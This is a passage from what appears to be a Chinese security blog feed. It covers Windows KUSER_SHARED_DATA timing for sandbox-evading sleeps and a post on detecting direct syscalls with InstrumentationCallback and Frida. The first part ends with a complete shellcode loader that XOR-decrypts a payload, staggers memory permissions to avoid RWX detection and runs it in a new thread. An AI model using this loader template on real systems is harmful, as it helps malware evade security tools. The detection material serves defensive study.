GlobalValidationRunlevel : Uint4B</span><br><span class="line">   +<span class="number">0x25c</span> TimeZoneBiasStamp : Int4B</span><br><span class="line">   +<span class="number">0x260</span> NtBuildNumber    : Uint4B</span><br><span class="line">   +<span class="number">0x264</span> NtProductType    : _NT_PRODUCT_TYPE</span><br><span class="line">   +<span class="number">0x268</span> ProductTypeIsValid : UChar</span><br><span class="line">   +<span class="number">0x269</span> Reserved0        : [<span class="number">1</span>] UChar</span><br><span class="line">   +<span class="number">0x26a</span> NativeProcessorArchitecture : Uint2B</span><br><span class="line">   +<span class="number">0x26c</span> NtMajorVersion   : Uint4B</span><br><span class="line">   +<span class="number">0x270</span> NtMinorVersion   : Uint4B</span><br><span class="line">   +<span class="number">0x274</span> ProcessorFeatures : [<span class="number">64</span>] UChar</span><br><span class="line">   +<span class="number">0x2b4</span> Reserved1        : Uint4B</span><br><span class="line">   +<span class="number">0x2b8</span> Reserved3        : Uint4B</span><br><span class="line">   +<span class="number">0x2bc</span> TimeSlip         : Uint4B</span><br><span class="line">   +<span class="number">0x2c0</span> AlternativeArchitecture : _ALTERNATIVE_ARCHITECTURE_TYPE</span><br><span class="line">   +<span class="number">0x2c4</span> BootId           : Uint4B</span><br><span class="line">   +<span class="number">0x2c8</span> SystemExpirationDate : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x2d0</span> SuiteMask        : Uint4B</span><br><span class="line">   +<span class="number">0x2d4</span> KdDebuggerEnabled : UChar</span><br><span class="line">   +<span class="number">0x2d5</span> MitigationPolicies : UChar</span><br><span class="line">   +<span class="number">0x2d5</span> NXSupportPolicy  : Pos <span class="number">0</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x2d5</span> SEHValidationPolicy : Pos <span class="number">2</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x2d5</span> CurDirDevicesSkippedForDlls : Pos <span class="number">4</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x2d5</span> Reserved         : Pos <span class="number">6</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x2d6</span> CyclesPerYield   : Uint2B</span><br><span class="line">   +<span class="number">0x2d8</span> ActiveConsoleId  : Uint4B</span><br><span class="line">   +<span class="number">0x2dc</span> DismountCount    : Uint4B</span><br><span class="line">   +<span class="number">0x2e0</span> ComPlusPackage   : Uint4B</span><br><span class="line">   +<span class="number">0x2e4</span> LastSystemRITEventTickCount : Uint4B</span><br><span class="line">   +<span class="number">0x2e8</span> NumberOfPhysicalPages : Uint4B</span><br><span class="line">   +<span class="number">0x2ec</span> SafeBootMode     : UChar</span><br><span class="line">   +<span class="number">0x2ed</span> VirtualizationFlags : UChar</span><br><span class="line">   +<span class="number">0x2ee</span> Reserved12       : [<span class="number">2</span>] UChar</span><br><span class="line">   +<span class="number">0x2f0</span> SharedDataFlags  : Uint4B</span><br><span class="line">   +<span class="number">0x2f0</span> DbgErrorPortPresent : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgElevationEnabled : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgVirtEnabled   : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgInstallerDetectEnabled : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgLkgEnabled    : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgDynProcessorEnabled : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgConsoleBrokerEnabled : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgSecureBootEnabled : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgMultiSessionSku : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgMultiUsersInSessionSku : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgStateSeparationEnabled : Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> SpareBits        : Pos <span class="number">11</span>, <span class="number">21</span> Bits</span><br><span class="line">   +<span class="number">0x2f4</span> DataFlagsPad     : [<span class="number">1</span>] Uint4B</span><br><span class="line">   +<span class="number">0x2f8</span> TestRetInstruction : Uint8B</span><br><span class="line">   +<span class="number">0x300</span> QpcFrequency     : Int8B</span><br><span class="line">   +<span class="number">0x308</span> SystemCall       : Uint4B</span><br><span class="line">   +<span class="number">0x30c</span> Reserved2        : Uint4B</span><br><span class="line">   +<span class="number">0x310</span> SystemCallPad    : [<span class="number">2</span>] Uint8B</span><br><span class="line">   +<span class="number">0x320</span> TickCount        : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x320</span> TickCountQuad    : Uint8B</span><br><span class="line">   +<span class="number">0x320</span> ReservedTickCountOverlay : [<span class="number">3</span>] Uint4B</span><br><span class="line">   +<span class="number">0x32c</span> TickCountPad     : [<span class="number">1</span>] Uint4B</span><br><span class="line">   +<span class="number">0x330</span> Cookie           : Uint4B</span><br><span class="line">   +<span class="number">0x334</span> CookiePad        : [<span class="number">1</span>] Uint4B</span><br><span class="line">   +<span class="number">0x338</span> ConsoleSessionForegroundProcessId : Int8B</span><br><span class="line">   +<span class="number">0x340</span> TimeUpdateLock   : Uint8B</span><br><span class="line">   +<span class="number">0x348</span> BaselineSystemTimeQpc : Uint8B</span><br><span class="line">   +<span class="number">0x350</span> BaselineInterruptTimeQpc : Uint8B</span><br><span class="line">   +<span class="number">0x358</span> QpcSystemTimeIncrement : Uint8B</span><br><span class="line">   +<span class="number">0x360</span> QpcInterruptTimeIncrement : Uint8B</span><br><span class="line">   +<span class="number">0x368</span> QpcSystemTimeIncrementShift : UChar</span><br><span class="line">   +<span class="number">0x369</span> QpcInterruptTimeIncrementShift : UChar</span><br><span class="line">   +<span class="number">0x36a</span> UnparkedProcessorCount : Uint2B</span><br><span class="line">   +<span class="number">0x36c</span> EnclaveFeatureMask : [<span class="number">4</span>] Uint4B</span><br><span class="line">   +<span class="number">0x37c</span> TelemetryCoverageRound : Uint4B</span><br><span class="line">   +<span class="number">0x380</span> UserModeGlobalLogger : [<span class="number">16</span>] Uint2B</span><br><span class="line">   +<span class="number">0x3a0</span> ImageFileExecutionOptions : Uint4B</span><br><span class="line">   +<span class="number">0x3a4</span> LangGenerationCount : Uint4B</span><br><span class="line">   +<span class="number">0x3a8</span> Reserved4        : Uint8B</span><br><span class="line">   +<span class="number">0x3b0</span> InterruptTimeBias : Uint8B</span><br><span class="line">   +<span class="number">0x3b8</span> QpcBias          : Uint8B</span><br><span class="line">   +<span class="number">0x3c0</span> ActiveProcessorCount : Uint4B</span><br><span class="line">   +<span class="number">0x3c4</span> ActiveGroupCount : UChar</span><br><span class="line">   +<span class="number">0x3c5</span> Reserved9        : UChar</span><br><span class="line">   +<span class="number">0x3c6</span> QpcData          : Uint2B</span><br><span class="line">   +<span class="number">0x3c6</span> QpcBypassEnabled : UChar</span><br><span class="line">   +<span class="number">0x3c7</span> QpcShift         : UChar</span><br><span class="line">   +<span class="number">0x3c8</span> TimeZoneBiasEffectiveStart : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x3d0</span> TimeZoneBiasEffectiveEnd : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x3d8</span> XState           : _XSTATE_CONFIGURATION</span><br><span class="line">   +<span class="number">0x710</span> FeatureConfigurationChangeStamp : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x71c</span> Spare            : Uint4B</span><br></pre></td></tr></table></figure>

<h5 id="SystemTime属性"><a href="#SystemTime属性" class="headerlink" title="SystemTime属性"></a>SystemTime属性</h5><p>SystemTime是一个100ns的计时器，从1月1日开始计时</p>
<p>在偏移量0x14处(0x7FFE0014) 虽然大小为12字节 但实际有效为前8字节（High1Time与High2Time相等）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">LARGE_INTEGER time;</span><br><span class="line">time.LowPart = *(DWORD*)(<span class="number">0x7FFE0000</span> + <span class="number">0x14</span>); <span class="comment">// Read LowPart as unsigned long.</span></span><br><span class="line">time.HighPart = *(<span class="type">long</span>*)(<span class="number">0x7FFE0000</span> + <span class="number">0x1c</span>); <span class="comment">// Read High1Part as long.</span></span><br></pre></td></tr></table></figure>

<p>_KSYSTEM_TIME结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">ntdll!_KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x000</span> LowPart          : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> High1Time        : Int4B</span><br><span class="line">   +<span class="number">0x008</span> High2Time        : Int4B</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_KSYSTEM_TIME</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">long</span> LowPart;</span><br><span class="line">     <span class="type">long</span> High1Time;</span><br><span class="line">     <span class="type">long</span> High2Time;</span><br><span class="line">&#125; KSYSTEM_TIME, *PKSYSTEM_TIME;</span><br></pre></td></tr></table></figure>

<p>可以使用它来作为sleep的替代方法</p>
<p>在C中可以不通过sleep函数调用来获取时间</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> __get_timestamp()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> UNIX_TIME_START = <span class="number">0x019DB1DED53E8000</span>; <span class="comment">// Start of Unix epoch in ticks.</span></span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> TICKS_PER_SECOND = <span class="number">10000000</span>; <span class="comment">// A tick is 100ns.</span></span><br><span class="line">	LARGE_INTEGER time;</span><br><span class="line">	time.LowPart = *(DWORD*)(<span class="number">0x7FFE0000</span> + <span class="number">0x14</span>); <span class="comment">// Read LowPart as unsigned long.</span></span><br><span class="line">	time.HighPart = *(<span class="type">long</span>*)(<span class="number">0x7FFE0000</span> + <span class="number">0x1c</span>); <span class="comment">// Read High1Part as long.</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LARGE_INTEGER</span> &#123;</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> &#123;</span><br><span class="line">     DWORD LowPart;		<span class="comment">//32位无符号整数 低32位</span></span><br><span class="line">     LONG  HighPart;	<span class="comment">//32为有符号整数 高32位</span></span><br><span class="line">    &#125; ;</span><br><span class="line">    __int64 QuadPart;	<span class="comment">// 64位整数</span></span><br><span class="line">  &#125; ;</span><br><span class="line">&#125; LARGE_INTEGER, *PLARGE_INTEGER;</span><br></pre></td></tr></table></figure>

<p>UNIX_TIME_START为Unix新纪元的开始，值为0x019DB1DED53E8000</p>
<p>只需要读取ShareUserData中的SystemTime属性的值，减去单位时间开始的Unix时间，在除以设定的精准度TICKS_PER_SECOND。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html">https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html</a></p>
<p><a href="https://shubakki.github.io/posts/2022/12/detecting-and-evading-sandboxing-through-time-based-evasion/">https://shubakki.github.io/posts/2022/12/detecting-and-evading-sandboxing-through-time-based-evasion/</a></p>
<p>change memory perms like RW -&gt; R -&gt; RX </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;snorlax.h&quot;</span> <span class="comment">// Header file containing our time based evasion stuff</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;utils.h&quot;</span> <span class="comment">// Header file containing RNG related stuff.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERVAL rand() % 26 <span class="comment">// Edit as you wish</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MS_PER_SECOND 1000 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLEEPTIME INTERVAL*MS_PER_SECOND <span class="comment">// Make the use easier</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> __get_timestamp()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> UNIX_TIME_START = <span class="number">0x019DB1DED53E8000</span>; <span class="comment">// Start of Unix epoch in ticks.</span></span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> TICKS_PER_MILLISECOND = <span class="number">10000</span>; <span class="comment">// A tick is 100ns.</span></span><br><span class="line">	LARGE_INTEGER time;</span><br><span class="line">	time.LowPart = *(DWORD*)(<span class="number">0x7FFE0000</span> + <span class="number">0x14</span>); <span class="comment">// Read LowPart as unsigned long.</span></span><br><span class="line">	time.HighPart = *(<span class="type">long</span>*)(<span class="number">0x7FFE0000</span> + <span class="number">0x1c</span>); <span class="comment">// Read High1Part as long.</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __alt_sleepms(<span class="type">size_t</span> ms)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">size_t</span> x = <span class="built_in">rand</span>(); <span class="comment">// random buffer var </span></span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> end = __get_timestamp() + ms; <span class="comment">// calculate when we shall stop sleeping</span></span><br><span class="line">	<span class="keyword">while</span> (__get_timestamp() &lt; end) &#123; x += <span class="number">1</span>; &#125; <span class="comment">// increment random var by 1 till we reach our endtime</span></span><br><span class="line">	<span class="keyword">if</span> (__get_timestamp() - end &gt; <span class="number">2000</span>) <span class="keyword">return</span>; <span class="comment">// Fast Forward check, might need some tuning	</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// seed our generator </span></span><br><span class="line">    <span class="comment">// defaultseed could be any seed you choose</span></span><br><span class="line">    <span class="comment">//but for obvious reasons i recommend using the __TIME__ macro for that.</span></span><br><span class="line">    <span class="built_in">srand</span>( defaultseed ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// initial timeout ? (could be extremely sus)</span></span><br><span class="line">    __alt_sleepms( SLEEPTIME * <span class="number">12</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// decrypt our xor encrypted shellcode</span></span><br><span class="line">    <span class="built_in">xor_bytes</span>( buf, SHELLCODE_SIZE, key, KEYLEN );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate RW memory</span></span><br><span class="line">    PVOID addr = <span class="built_in">VirtualAlloc</span>( <span class="literal">NULL</span>, <span class="built_in">sizeof</span>( buf ), ( MEM_RESERVE | MEM_COMMIT ), PAGE_READWRITE );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy our shellcode to the allocated memory</span></span><br><span class="line">    <span class="built_in">memcpy</span>( addr, buf, <span class="built_in">sizeof</span>( buf ) );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now the interesting part where we can leverage sleeping</span></span><br><span class="line">    <span class="comment">// We basically change memory perms like RW -&gt; R -&gt; RX </span></span><br><span class="line">    <span class="comment">// RWX memory can appear as an IOC</span></span><br><span class="line">    DWORD old_protect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>( addr, <span class="built_in">sizeof</span>( buf ), PAGE_READONLY, &amp;old_protect );</span><br><span class="line"></span><br><span class="line">    __alt_sleepms( SLEEPTIME );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualProtect</span>( addr, <span class="built_in">sizeof</span>( buf ), PAGE_EXECUTE_READ, &amp;oldProtect );</span><br><span class="line"></span><br><span class="line">    __alt_sleepms( SLEEPTIME );</span><br><span class="line"></span><br><span class="line">    DWORD id;</span><br><span class="line">    HANDLE thread = <span class="built_in">CreateThread</span>( <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)addr, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;id );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>( thread, INFINITE );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>Syscall Detect</title>
    <url>/posts/973bd040/</url>
    <content><![CDATA[<h3 id="Syscall检测"><a href="#Syscall检测" class="headerlink" title="Syscall检测"></a>Syscall检测</h3><p>在ntdll.dll中的系统调用一般都会遵循结构代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">mov r10, rcx				<span class="comment">// 0x4c, 0x8b, 0xd1</span></span><br><span class="line">mov eax, 「Syscall Number」	<span class="comment">// 0xb8, 0x00, 0x00, 0x00, 0x00</span></span><br><span class="line">syscall						<span class="comment">// 0x0f, 0x05</span></span><br><span class="line">ret							<span class="comment">// 0xc3</span></span><br></pre></td></tr></table></figure>

<p>当通过API调用Syscall时，流程如下所示:</p>
<p><img src="/posts/973bd040/1.png" alt="img"></p>
<p>可以观察到当从内核返回进入用户模式代码时，RIP在ntdll中。在syscall指令之后通常会有一个ret，它讲执行返回给调用者。</p>
<p>而当使用SysWhispers调用函数时，syscall指令会直接在程序的主模块执行，流程如下所示：</p>
<p><img src="/posts/973bd040/2.png" alt="img"></p>
<h4 id="利用InstrumentationCallback"><a href="#利用InstrumentationCallback" class="headerlink" title="利用InstrumentationCallback"></a>利用InstrumentationCallback</h4><p><a href="https://www.codeproject.com/Articles/543542/Windows-x64-system-service-hooks-and-advanced-debu">https://www.codeproject.com/Articles/543542/Windows-x64-system-service-hooks-and-advanced-debu</a></p>
<p><a href="https://winternl.com/detecting-manual-syscalls-from-user-mode/">https://winternl.com/detecting-manual-syscalls-from-user-mode/</a></p>
<p><a href="https://pre.empt.blog/2022/implementing-syscall-detection-into-fennec">https://pre.empt.blog/2022/implementing-syscall-detection-into-fennec</a>  </p>
<p>具体思路：</p>
<p>利用<code>KPROCESS!InstrumentationCallback</code> 字段在每次有内核到用户模式切换是执行回调。其主要思想上保存RIP，并对其进行分析，以确定当执行返回到用户模式时，它是否在ntdll.dll地址空间中。</p>
<p>每当内核遇到返回用户级代码时，它都会检查<code>KPROCESS!InstrumentationCallback</code>成员是否为NULL，如果它不为NULL且指向有效内存，内核将交换掉 陷阱帧上的RIP，并将其替换为InstrumentationCallback字段中存储的值。</p>
<p>相关项目： </p>
<p><a href="https://github.com/jackullrich/syscall-detect">https://github.com/jackullrich/syscall-detect</a></p>
<p><a href="https://github.com/paranoidninja/Process-Instrumentation-Syscall-Hook">https://github.com/paranoidninja/Process-Instrumentation-Syscall-Hook</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">003</span>&gt; dt _kprocess</span><br><span class="line">ntdll!_KPROCESS</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    +<span class="number">0x3d8</span> InstrumentationCallback : Ptr64 Void</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONG Version;</span><br><span class="line">    ULONG Reserved;</span><br><span class="line">    PVOID Callback;</span><br><span class="line">&#125; PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, *PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;</span><br></pre></td></tr></table></figure>

<p>KPROCESS!InstrumentationCallback 可通过调用NtSetInformationProcess来设置</p>
<p>可以使用PROCESSINFOCLASS 值和一个指向PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION的指针来调用NtSetInformationProcess</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">NtSetInformationProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG ProcessInfoClass,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> *InputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG size</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ProcessInstrumentationCallback  40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION</span></span><br><span class="line">&#123;</span><br><span class="line">	ULONG Version;</span><br><span class="line">	ULONG Reserved;</span><br><span class="line">	PVOID Callback;</span><br><span class="line">&#125; PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, * PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION Callback = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">Callback.Version = <span class="number">0</span>;	<span class="comment">// version 0表示为x64 1表示为x86</span></span><br><span class="line">Callback.Reserved = <span class="number">0</span>;	<span class="comment">// reserved always 0</span></span><br><span class="line">Callback.Callback = InstrumentationCallbackThunk;</span><br><span class="line"></span><br><span class="line"><span class="built_in">NtSetInformationProcess</span>(</span><br><span class="line">    <span class="built_in">GetCurrentProcess</span>(),</span><br><span class="line">    (PROCESS_INFORMATION_CLASS)ProcessInstrumentationCallback,</span><br><span class="line">    &amp;Callback,</span><br><span class="line">    <span class="built_in">sizeof</span>(Callback)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">include ksamd64.inc</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> InstrumentationCallback:proc</span><br><span class="line">EXTERNDEF __imp_RtlCaptureContext:QWORD</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line"></span><br><span class="line">InstrumentationCallbackThunk proc</span><br><span class="line">				mov     gs:[<span class="number">2e0</span>h], rsp            ; Win10 TEB InstrumentationCallbackPreviousSp</span><br><span class="line">				mov     gs:[<span class="number">2</span>d8h], r10            ; Win10 TEB InstrumentationCallbackPreviousPc</span><br><span class="line">				mov     r10, rcx                  ; Save original RCX</span><br><span class="line">				sub     rsp, <span class="number">4</span>d0h                 ; Alloc stack space <span class="keyword">for</span> CONTEXT structure</span><br><span class="line">				<span class="keyword">and</span>     rsp, <span class="number">-10</span>h                 ; RSP must be <span class="number">16</span> byte aligned before calls</span><br><span class="line">				mov     rcx, rsp</span><br><span class="line">				call    __imp_RtlCaptureContext   ; Save the current <span class="keyword">register</span> state. RtlCaptureContext does <span class="keyword">not</span> require shadow space</span><br><span class="line">				sub     rsp, <span class="number">20</span>h                  ; Shadow space</span><br><span class="line">				call    InstrumentationCallback</span><br><span class="line">				<span class="type">int</span>     <span class="number">3</span></span><br><span class="line">InstrumentationCallbackThunk endp</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">InstrumentationCallback</span><span class="params">(CONTEXT *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG_PTR pTEB = (ULONG_PTR)<span class="built_in">NtCurrentTeb</span>();</span><br><span class="line"></span><br><span class="line">	context-&gt;Rip = *((ULONG_PTR*)(pTEB + <span class="number">0x02D8</span>)); <span class="comment">// TEB-&gt;InstrumentationCallbackPreviousPc</span></span><br><span class="line">	context-&gt;Rsp = *((ULONG_PTR*)(pTEB + <span class="number">0x02E0</span>)); <span class="comment">// TEB-&gt;InstrumentationCallbackPreviousSp</span></span><br><span class="line">	context-&gt;Rcx = context-&gt;R10;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Prevent recursion TEB-&gt;InstrumentationCallbackDisabled</span></span><br><span class="line">	BOOLEAN bInstrumentationCallbackDisabled = *((BOOLEAN*)pTEB + <span class="number">0x1b8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!bInstrumentationCallbackDisabled) &#123;</span><br><span class="line">		bInstrumentationCallbackDisabled = TRUE;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Do whatever you want</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">// Enabling so we can catch next callback.</span></span><br><span class="line">		bInstrumentationCallbackDisabled = FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">RtlRestoreContext</span>(context, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetInstrumentationCallback</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION Callback = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">    NTSTATUS Status = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    Callback.Version = <span class="number">0</span>;</span><br><span class="line">    Callback.Reserved = <span class="number">0</span>;</span><br><span class="line">    Callback.Callback = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    HMODULE hNtdll = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hNtdll == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)<span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;NtSetInformationProcess&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (NtSetInformationProcess == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Status = <span class="built_in">NtSetInformationProcess</span>(</span><br><span class="line">        hProcess,</span><br><span class="line">        (PROCESS_INFORMATION_CLASS)ProcessInstrumentationCallback,</span><br><span class="line">        &amp;Callback,</span><br><span class="line">        <span class="built_in">sizeof</span>(Callback)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/973bd040/3.png" alt="img"></p>
<p>在以下几种情况下 InstrumentationCallback不会产生任何结果</p>
<ul>
<li>NtTerminateProcess 和 NtTerminateThread (如果是调用自身)</li>
</ul>
<p>调用方不会从这些调用中返回</p>
<ul>
<li>NtContinue</li>
</ul>
<p>该函数接受提供的上下文参数，并直接应用于当前陷阱帧 trap frame，然后不使用KeSystemServiceExit执行IRET</p>
<ul>
<li>NtRaiseExeception</li>
</ul>
<p>和NtContinue类似，该函数接受提供的上下文参数，并将其应用于当前陷阱帧 trap frame，但是，如果没有处理 KiUserExceptionDispatcher，那么将调用它，从而给予我们拦截的机会。</p>
<hr>
<h4 id="利用frida对syscall进行检测"><a href="#利用frida对syscall进行检测" class="headerlink" title="利用frida对syscall进行检测"></a>利用frida对syscall进行检测</h4><p><a href="https://passthehashbrowns.github.io/detecting-direct-syscalls-with-frida">https://passthehashbrowns.github.io/detecting-direct-syscalls-with-frida</a></p>
<p>pip3 install frida</p>
<p>pip3 install frida-tools</p>
<p>安装完成后可以使用frida-ps检测</p>
<p>frida C:\Users\test\Desktop\Syscall-Main\SyscallDemo\x64\Debug\SyscallDemo_calc.exe  -l 1.js</p>
